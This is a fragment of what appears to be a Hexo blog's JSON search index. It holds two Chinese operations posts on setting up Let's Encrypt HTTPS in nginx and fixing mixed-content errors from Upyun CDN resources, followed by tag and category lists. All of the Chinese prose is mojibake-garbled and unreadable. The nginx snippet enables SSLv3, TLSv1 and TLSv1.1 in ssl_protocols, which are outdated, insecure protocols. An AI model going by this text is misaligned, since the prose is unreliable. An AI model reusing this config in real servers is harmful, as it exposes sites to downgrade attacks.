é…ç½®æ–‡ä»¶åŠ å…¥å¦‚ä¸‹è®¾ç½®ï¼š 12345678listen 443ssl on;ssl_certificate /etc/letsencrypt/live/ç½‘ç«™åŸŸå/fullchain.pem;ssl_certificate_key /etc/letsencrypt/live/ç½‘ç«™åŸŸå/privkey.pem;ssl_dhparam /etc/ssl/certs/dhparams.pem;ssl_protocols SSLv3 TLSv1 TLSv1.1 TLSv1.2;ssl_ciphers HIGH:!aNULL:!MD5; ç„¶åé‡å¯ nginx æœåŠ¡å°±å¯ä»¥äº† 6. å¼ºåˆ¶è·³è½¬ httpshttps é»˜è®¤æ˜¯ç›‘å¬ 443 ç«¯å£çš„ï¼Œæ²¡å¼€å¯ https è®¿é—®çš„è¯ä¸€èˆ¬é»˜è®¤æ˜¯ 80 ç«¯å£ã€‚å¦‚æœä½ ç¡®å®šç½‘ç«™ 80 ç«¯å£ä¸Šçš„ç«™ç‚¹éƒ½æ”¯æŒ https çš„è¯åŠ å…¥ä¸‹é¢çš„é…ä»¶å¯ä»¥è‡ªåŠ¨é‡å®šå‘åˆ° https 12345server &#123; listen 80; server_name your.domain.com; return 301 https://$server_name$request_uri;&#125; 7. è¯ä¹¦æ›´æ–°å…è´¹è¯ä¹¦åªæœ‰ 90 å¤©çš„æœ‰æ•ˆæœŸï¼Œåˆ°æ—¶éœ€è¦æ‰‹åŠ¨æ›´æ–° renewã€‚åˆšå¥½ Letâ€™s encrypt æ——ä¸‹è¿˜æœ‰ä¸€ä¸ª Letâ€™s monitor å…è´¹æœåŠ¡ï¼Œæ³¨å†Œè´¦å·æ·»åŠ éœ€è¦ç›‘æ§çš„åŸŸåï¼Œç³»ç»Ÿä¼šåœ¨è¯ä¹¦é©¬ä¸Šåˆ°æœŸæ—¶å‘å‡ºæé†’é‚®ä»¶ï¼Œéå¸¸æ–¹ä¾¿ã€‚æ”¶åˆ°é‚®ä»¶åå»åå°æ‰§è¡Œ renew å³å¯ï¼Œå¦‚æœæç¤ºæˆåŠŸå°±è¡¨ç¤º renew æˆåŠŸ 1./certbot-auto renew","link":"/2016/11/24/WebæœåŠ¡æŠ€æœ¯/ç”³è¯·è¯ä¹¦Https/å…è´¹ Https è¯ä¹¦ï¼ˆLet'S Encryptï¼‰ç”³è¯·ä¸é…ç½® /"},{"title":"è§£å†³Httpsè¯·æ±‚è·¨åŸŸCDNèµ„æºhttpç½‘ç«™å‡ºç°è®¿é—®å¤±è´¥-è¯ä¹¦æ˜¾ç¤ºä¸å®‰å…¨","text":"è§£å†³Httpsè¯·æ±‚è·¨åŸŸCDNèµ„æºhttpç½‘ç«™å‡ºç°è®¿é—®å¤±è´¥-è¯ä¹¦æ˜¾ç¤ºä¸å®‰å…¨è¿™é‡Œè®²å¦‚ä½•è§£å†³è·¨åŸŸhttpèµ„æºè¯·æ±‚è¯ä¹¦å‡ºç°é—®é¢˜ï¼Œ ä¸Šä¸€ç¯‡æˆ‘è§£å†³ç½‘ç«™å¦‚ä½•ç”³è¯·å…è´¹è¯ä¹¦ï¼Œå®ç°ç”³è¯·å…è´¹è¯ä¹¦åœ¨Nginxä¸Šé¢å®ç°httpsè®¿é—®ã€‚ å¯æ˜¯æˆ‘ä¸€å¼€å§‹æ²¡æœ‰è¿™ä¹ˆé¡ºåˆ©å®ç°æˆ‘æƒ³è¦çš„æ•ˆæœï¼Œå› ä¸ºçš„ç¡®è¯ä¹¦æ˜¯æœ‰äº†è®¿é—®å¯ä»¥httpså¯æ˜¯è¯·æ±‚è·¨åŸŸhttpæœåŠ¡å°±å‡ºç°é—®é¢˜äº†ã€‚è¿™é‡Œæˆ‘æ˜¯åœ¨åˆæ‹äº‘åšCDNåŠ é€Ÿçš„ï¼Œæ‰€ä»¥è¿™é‡Œè¯´æ˜ä¸‹å¦‚æœä½ çš„å…¬å¸ç½‘ç«™æ¯”å¦‚è¯´ï¼šihaozhuo.comé‚£ä¹ˆè¯·æ±‚çš„æ—¶å€™https://ihaozhuo.com å‡ºç°æˆ‘ä¸‹é¢åŒæ ·çš„é—®é¢˜: è¿™æ˜¯æˆ‘æ˜¾ç¤ºçš„é”™è¯¯å›¾ç‰‡å½“åˆæˆªå›¾ç•™ä¸‹è®°å½•æˆæ–‡æ¡£äº†ã€‚è¿™é‡Œæˆ‘ä¹Ÿåšäº†HTTPSå®‰å…¨æ£€æµ‹ï¼šhttps://www.ssllabs.com/ssltest å¦‚ä½•è§£å†³ï¼šè¿™é‡Œæˆ‘é—®å‰ç«¯çš„ä»£ç é™æ€èµ„æºä¸Šé¢è¯·æ±‚upyunçš„httpå»è®¿é—®ï¼Œè¿™é‡Œæˆ‘ä»¬åœ¨upyunå¯¹è¯·æ±‚åŸŸåè®¾ç½®httpsæ–¹æ³•ï¼š upyunå¯¹åº”çš„æœåŠ¡åˆ—è¡¨è®¾ç½®é‡Œé¢é€‰æ‹©httpsè®¾ç½® é…ç½®å¥½ä»¥åå°±å¯ä»¥ç”Ÿæ•ˆäº†ã€‚ è¿™é‡Œéœ€è¦æŠŠåœ°å€ç»™åˆ°å‰ç«¯è®©ä»–ä»¬åœ¨ä»£ç ä¸Šé¢ä¿®æ”¹ä¸‹HTTPS æ›´æ–°ä¸‹æœåŠ¡é‡å¯å°±å‡ºç°è®¿é—®æ­£å¸¸äº†ã€‚","link":"/2016/11/23/WebæœåŠ¡æŠ€æœ¯/ç”³è¯·è¯ä¹¦Https/è§£å†³Httpsè¯·æ±‚è·¨åŸŸCDNèµ„æºhttpç½‘ç«™å‡ºç°è®¿é—®å¤±è´¥-è¯ä¹¦æ˜¾ç¤ºä¸å®‰å…¨/"}],"tags":[{"name":"Bigdata Hadoop","slug":"Bigdata-Hadoop","link":"/tags/Bigdata-Hadoop/"},{"name":"Ambari","slug":"Ambari","link":"/tags/Ambari/"},{"name":"Node.js","slug":"Node-js","link":"/tags/Node-js/"},{"name":"Grunt","slug":"Grunt","link":"/tags/Grunt/"},{"name":"OpenLDAP","slug":"OpenLDAP","link":"/tags/OpenLDAP/"},{"name":"Shell programming","slug":"Shell-programming","link":"/tags/Shell-programming/"},{"name":"Operation safety","slug":"Operation-safety","link":"/tags/Operation-safety/"},{"name":"Automation Deploy","slug":"Automation-Deploy","link":"/tags/Automation-Deploy/"},{"name":"Performance monitoring","slug":"Performance-monitoring","link":"/tags/Performance-monitoring/"},{"name":"CDN","slug":"CDN","link":"/tags/CDN/"},{"name":"Operation and maintenance Road","slug":"Operation-and-maintenance-Road","link":"/tags/Operation-and-maintenance-Road/"},{"name":"Kafka","slug":"Kafka","link":"/tags/Kafka/"},{"name":"Prometheus","slug":"Prometheus","link":"/tags/Prometheus/"},{"name":"Grafana","slug":"Grafana","link":"/tags/Grafana/"},{"name":"Zabbix","slug":"Zabbix","link":"/tags/Zabbix/"},{"name":"Rabbitmq","slug":"Rabbitmq","link":"/tags/Rabbitmq/"},{"name":"Countly","slug":"Countly","link":"/tags/Countly/"},{"name":"ZooKeeper","slug":"ZooKeeper","link":"/tags/ZooKeeper/"},{"name":"Smokeping","slug":"Smokeping","link":"/tags/Smokeping/"},{"name":"IDCç›‘æ§","slug":"IDCç›‘æ§","link":"/tags/IDCç›‘æ§/"},{"name":"Zabbix monitoring","slug":"Zabbix-monitoring","link":"/tags/Zabbix-monitoring/"},{"name":"logstash","slug":"logstash","link":"/tags/logstash/"},{"name":"Cacti monitoring","slug":"Cacti-monitoring","link":"/tags/Cacti-monitoring/"},{"name":"Elasticsearch","slug":"Elasticsearch","link":"/tags/Elasticsearch/"},{"name":"Kibana","slug":"Kibana","link":"/tags/Kibana/"},{"name":"Log analysis platform","slug":"Log-analysis-platform","link":"/tags/Log-analysis-platform/"},{"name":"Graylog","slug":"Graylog","link":"/tags/Graylog/"},{"name":"Ansible","slug":"Ansible","link":"/tags/Ansible/"},{"name":"Jenkins","slug":"Jenkins","link":"/tags/Jenkins/"},{"name":"Manven","slug":"Manven","link":"/tags/Manven/"},{"name":"Phabricator","slug":"Phabricator","link":"/tags/Phabricator/"},{"name":"Saltstack","slug":"Saltstack","link":"/tags/Saltstack/"},{"name":"Java+Tomcat notes","slug":"Java-Tomcat-notes","link":"/tags/Java-Tomcat-notes/"},{"name":"performance tuning","slug":"performance-tuning","link":"/tags/performance-tuning/"},{"name":"Java","slug":"Java","link":"/tags/Java/"},{"name":"Web Service","slug":"Web-Service","link":"/tags/Web-Service/"},{"name":"Nginx","slug":"Nginx","link":"/tags/Nginx/"}],"categories":[{"name":"Bigdata Hadoop","slug":"Bigdata-Hadoop","link":"/categories/Bigdata-Hadoop/"},{"name":"OpenLDAP","slug":"OpenLDAP","link":"/categories/OpenLDAP/"},{"name":"è¿ç»´å®‰å…¨","slug":"è¿ç»´å®‰å…¨","link":"/categories/è¿ç»´å®‰å…¨/"},{"name":"è¿ç»´ç¬”è®°","slug":"è¿ç»´ç¬”è®°","link":"/categories/è¿ç»´ç¬”è®°/"},{"name":"Framework","slug":"Framework","link":"/categories/Framework/"},{"name":"automation","slug":"automation","link":"/categories/automation/"},{"name":"å¤§æ•°æ®","slug":"å¤§æ•°æ®","link":"/categories/å¤§æ•°æ®/"},{"name":"Kafka","slug":"Kafka","link":"/categories/Kafka/"},{"name":"Bigdata","slug":"Bigdata","link":"/categories/Bigdata/"},{"name":"monitoring","slug":"monitoring","link":"/categories/monitoring/"},{"name":"Log Analysis Platform","slug":"Log-Analysis-Platform","link":"/categories/Log-Analysis-Platform/"},{"name":"Automation","slug":"Automation","link":"/categories/Automation/"},{"name":"tomcat","slug":"tomcat","link":"/categories/tomcat/"},{"name":"Java","slug":"Java","link":"/categories/Java/"},{"name":"nginx","slug":"nginx","link":"/categories/nginx/"},{"name":"Nginx","slug":"Nginx","link":"/categories/Nginx/"}]}